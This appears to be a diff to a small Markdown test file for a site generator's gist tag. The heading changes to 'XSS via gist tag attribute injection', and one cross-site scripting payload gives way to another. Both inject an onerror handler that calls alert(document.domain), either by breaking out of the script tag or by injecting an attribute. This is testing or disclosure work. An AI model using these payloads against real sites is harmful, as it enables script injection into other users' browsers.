@@ -1,7 +1,7 @@
 ---
 ---
 
-# XSS Test
+# XSS via gist tag attribute injection
 
-{% gist x"></script><img/src=x onerror=alert(document.domain)><script%20x=" %}
+{% gist x"onerror="alert(document.domain)"x=" %}
 
